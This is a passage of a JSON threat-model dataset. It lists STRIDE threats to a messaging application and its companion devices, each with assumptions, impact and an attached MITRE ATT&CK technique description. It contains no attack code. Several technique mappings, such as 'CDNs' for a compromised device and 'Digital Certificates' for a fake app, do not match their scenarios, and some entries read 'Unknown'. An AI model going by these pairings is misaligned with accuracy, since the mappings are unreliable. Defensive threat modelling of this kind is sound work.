                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
                "technique_id": "T1566.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with the SQLite database storing authentication credentials and messages on a compromised device.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to the device.",
                    "Role": "Attacker",
                    "Condition": "Compromised device security."
                },
                {
                    "Assumption": "The database is not adequately encrypted or protected.",
                    "Role": "System",
                    "Condition": "Weak or no encryption mechanisms."
                },
                {
                    "Assumption": "The attacker has the tools and skills to manipulate SQLite databases.",
                    "Role": "Attacker",
                    "Condition": "Technical proficiency in database management."
                }
            ],
            "Potential Impact": "Corruption of authentication credentials and message integrity; potential data breach.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database manipulation",
                "credential storage",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Credentials In Files",
                "description": "Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).(Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.(Citation: SRD GPP)\n\nIn cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)",
                "id": "attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc",
                "technique_id": "T1552.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into the mobile or desktop application during a software update.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept the update process or access the update server.",
                    "Role": "Attacker",
                    "Condition": "Vulnerable update mechanisms."
                },
                {
                    "Assumption": "Update files are not adequately verified before installation.",
                    "Role": "System",
                    "Condition": "Lack of integrity checks or signature verification."
                },
                {
                    "Assumption": "Users do not notice discrepancies in the update process.",
                    "Role": "User",
                    "Condition": "Lack of vigilance or understanding."
                }
            ],
            "Potential Impact": "Execution of malicious code leading to data breach, system compromise.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "software update",
                "code injection",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
                "technique_id": "T1195"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the encryption protocols used by the messaging application to introduce vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has insider access or privileges to modify source code.",
                    "Role": "Attacker",
                    "Condition": "Insider threat or privilege escalation."
                },
                {
                    "Assumption": "Source code changes are not thoroughly reviewed.",
                    "Role": "Development Team",
                    "Condition": "Insufficient code review processes."
                },
                {
                    "Assumption": "Cryptographic implementations are not independently verified.",
                    "Role": "System",
                    "Condition": "Lack of external audits and verification."
                }
            ],
            "Potential Impact": "Compromise of encryption leading to unauthorized message decryption.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cryptographic manipulation",
                "protocol downgrade",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a particular message, claiming the message was tampered with or sent by an impostor.",
            "Assumptions": [
                {
                    "Assumption": "The application does not keep tamper-evident logs of message exchanges.",
                    "Role": "System",
                    "Condition": "Absence of integrity checks on message logs."
                },
                {
                    "Assumption": "Users are not required to sign messages with their private key.",
                    "Role": "System",
                    "Condition": "Weak message authentication practices."
                },
                {
                    "Assumption": "There is no mechanism to verify the origin of messages.",
                    "Role": "System",
                    "Condition": "Lack of non-repudiation mechanisms."
                }
            ],
            "Potential Impact": "Disputes over message authenticity and trust issues among users.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "message tampering",
                "non-repudiation",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user claims they did not register their account on a companion device, denying any knowledge of the device setup.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log or verify device associations.",
                    "Role": "System",
                    "Condition": "Missing or weak device association mechanisms."
                },
                {
                    "Assumption": "Users can easily claim impersonation without verifiable evidence.",
                    "Role": "User",
                    "Condition": "Lack of strong authentication methods."
                },
                {
                    "Assumption": "Companion device registrations are not audited or monitored.",
                    "Role": "System",
                    "Condition": "Absence of comprehensive audit logs."
                }
            ],
            "Potential Impact": "Difficulty in establishing trust and verifying device legitimacy; potential unauthorized device usage.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "device registration",
                "identity",
                "audit logging"
            ],
            "mitre_technique": {
                "name": "Device Registration",
                "description": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\n\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user\u2019s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)\n\nSimilarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) \n\nDevices registered in Azure AD may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Azure AD tenant by registering a large number of devices.(Citation: AADInternals - BPRT)",
                "id": "attack-pattern--7decb26c-715c-40cf-b7e0-026f7d7cc215",
                "technique_id": "T1098.005"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user disputes a financial transaction conducted through the messaging application, denying their involvement.",
            "Assumptions": [
                {
                    "Assumption": "Transactions are not cryptographically signed by the user.",
                    "Role": "System",
                    "Condition": "Lack of strong transaction authentication."
                },
                {
                    "Assumption": "Transaction logs are not tamper-proof.",
                    "Role": "System",
                    "Condition": "Weak audit or logging mechanisms."
                },
                {
                    "Assumption": "Users can deny transactions without facing immediate consequences.",
                    "Role": "User",
                    "Condition": "No deterrents for false claims."
                }
            ],
            "Potential Impact": "Disputes over financial transactions and potential financial loss.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "financial transaction",
                "transaction logging",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker compromises a companion device, accessing stored messages and sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "The companion device stores unprotected sensitive data.",
                    "Role": "System",
                    "Condition": "Lack of encryption for locally stored data."
                },
                {
                    "Assumption": "The device's security measures can be bypassed.",
                    "Role": "Attacker",
                    "Condition": "Weak device security or protective controls."
                },
                {
                    "Assumption": "Users do not detect or respond to the device compromise promptly.",
                    "Role": "User",
                    "Condition": "Lack of monitoring and incident response."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive messages and information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "device compromise",
                "data at rest",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "CDNs",
                "description": "Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor\u2019s geographical region.\n\nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization\u2019s website.(Citation: DigitalShadows CDN) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).",
                "id": "attack-pattern--91177e6d-b616-4a03-ba4b-f3b32f7dda75",
                "technique_id": "T1596.004"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the encryption protocol to access message content.",
            "Assumptions": [
                {
                    "Assumption": "There is an undiscovered or unpatched vulnerability in the encryption protocol.",
                    "Role": "System",
                    "Condition": "Incomplete or delayed vulnerability management."
                },
                {
                    "Assumption": "The attacker has the capability to exploit the cryptographic vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Advanced technical skills and resources."
                },
                {
                    "Assumption": "The encrypted messages are not adequately protected against such attacks.",
                    "Role": "System",
                    "Condition": "Weak cryptographic resilience."
                }
            ],
            "Potential Impact": "Unauthorized decryption and access to message content.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cryptographic exploitation",
                "encryption vulnerability",
                "message decryption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Malware on a user's device logs keystrokes and screen captures, sending sensitive message content to the attacker.",
            "Assumptions": [
                {
                    "Assumption": "The user's device is infected with malware.",
                    "Role": "User",
                    "Condition": "Compromised device security."
                },
                {
                    "Assumption": "The malware can bypass existing security controls.",
                    "Role": "Attacker",
                    "Condition": "Advanced malware capabilities."
                },
                {
                    "Assumption": "Users are unaware of the malware presence and activity.",
                    "Role": "User",
                    "Condition": "Lack of malware detection and response."
                }
            ],
            "Potential Impact": "Compromise of sensitive message content and potential identity theft.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "malware",
                "keystroke logging",
                "screen capturing"
            ],
            "mitre_technique": {
                "name": "Screen Capture",
                "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\n",
                "id": "attack-pattern--0259baeb-9f63-4c69-bf10-eb038c390688",
                "technique_id": "T1113"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a distributed denial of service (DDoS) attack on the messaging service infrastructure, disrupting service availability.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has control over a large botnet.",
                    "Role": "Attacker",
                    "Condition": "Access to a distributed network of compromised devices."
                },
                {
                    "Assumption": "The service infrastructure lacks adequate DDoS protection mechanisms.",
                    "Role": "System",
                    "Condition": "Insufficient DDoS mitigation strategies."
                },
                {
                    "Assumption": "The attack volume exceeds the capacity of the service infrastructure.",
                    "Role": "System",
                    "Condition": "Limited scalability or redundancy."
                }
            ],
            "Potential Impact": "Service disruption, preventing users from accessing messaging services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "distributed attack",
                "service disruption",
                "infrastructure"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the messaging application to crash the application on user devices.",
            "Assumptions": [
                {
                    "Assumption": "The application contains an unpatched vulnerability.",
                    "Role": "System",
                    "Condition": "Incomplete or delayed vulnerability management."
                },
                {
                    "Assumption": "The attacker has knowledge of the vulnerability and can exploit it.",
                    "Role": "Attacker",
                    "Condition": "Advanced technical skills and resources."
                },
                {
                    "Assumption": "Users do not have mechanisms to detect and prevent the exploit.",
                    "Role": "User",
                    "Condition": "Lack of application updates and security measures."
                }
            ],
            "Potential Impact": "Application crashes and service unavailability for affected users.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "application vulnerability",
                "crashing",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overloads the messaging application servers with illegitimate requests, exhausting server resources.",
            "Assumptions": [
                {
                    "Assumption": "The servers have limited resource capacity to handle high volumes of requests.",
                    "Role": "System",
                    "Condition": "Insufficient scalability or resource management."
                },
                {
                    "Assumption": "The attacker can generate a high volume of requests.",
                    "Role": "Attacker",
                    "Condition": "Access to automated or distributed tools."
                },
                {
                    "Assumption": "The service does not have effective rate-limiting or traffic filtering mechanisms.",
                    "Role": "System",
                    "Condition": "Lack of protective controls against request flooding."
                }
            ],
            "Potential Impact": "Service slowdown or unavailability due to resource exhaustion.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "request flooding",
                "server overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges on a compromised device to gain access to sensitive data and settings.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can exploit known vulnerabilities in the device's operating system.",
                    "Role": "Attacker",
                    "Condition": "Outdated or unpatched device operating system."
                },
                {
                    "Assumption": "The device does not utilize effective privilege escalation protection mechanisms.",
                    "Role": "System",
                    "Condition": "Lack of security controls or preventive measures."
                },
                {
                    "Assumption": "The attacker has physical or remote access to the device.",
                    "Role": "Attacker",
                    "Condition": "Device is already compromised."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and potential system modifications.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "device compromise",
                "privilege escalation",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\n\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--46944654-fcc1-4f63-9dad-628102376586",
                "technique_id": "T1038"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a flaw in the companion device linking process to escalate privileges and control other linked devices.",
            "Assumptions": [
                {
                    "Assumption": "The linking process contains a vulnerability that can be exploited for privilege escalation.",
                    "Role": "System",
                    "Condition": "Flawed device linking protocols."
                },
                {
                    "Assumption": "The attacker can access the linking process during authentication.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access to the linking process."
                },
                {
                    "Assumption": "Users do not detect unauthorized device linkages promptly.",
                    "Role": "User",
                    "Condition": "Lack of monitoring and alert mechanisms."
                }
            ],
            "Potential Impact": "Control over additional devices and potential unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "device linking",
                "authentication bypass",
                "linked device control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software flaw in the messaging application to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "The messaging application contains an unpatched software flaw.",
                    "Role": "System",
                    "Condition": "Incomplete or delayed vulnerability management."
                },
                {
                    "Assumption": "The attacker has the knowledge and tools to exploit the flaw.",
                    "Role": "Attacker",
                    "Condition": "Advanced technical capabilities."
                },
                {
                    "Assumption": "Users are running vulnerable versions of the application.",
                    "Role": "User",
                    "Condition": "Failure to update software regularly."
                }
            ],
            "Potential Impact": "Unauthorized administrative access and potential system compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "software exploitation",
                "administrative access",
                "application flaw"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "23",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake messaging application with a similar name and interface to trick users into downloading and using it, capturing sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Users can be deceived by phishing tactics.",
                    "Role": "User",
                    "Condition": "When users haven't verified the source of the application."
                },
                {
                    "Assumption": "Attackers can successfully replicate the interface and logo of the genuine application.",
                    "Role": "Attacker",
                    "Condition": "If attackers have access to design resources."
                },
                {
                    "Assumption": "App stores or other download sources don't sufficiently vet applications before listing them.",
                    "Role": "App store",
                    "Condition": "If vetting processes are weak or flawed."
                }
            ],
            "Potential Impact": "Confidentiality is compromised if users' messages are intercepted.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "phishing",
                "fake application",
                "credential harvesting"
            ],
            "mitre_technique": {
                "name": "Digital Certificates",
                "description": "Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "id": "attack-pattern--0979abf9-4e26-43ec-9b6e-54efc4e70fca",
                "technique_id": "T1596.003"
            }
        },
        {
            "Threat Type": "Spoofing",
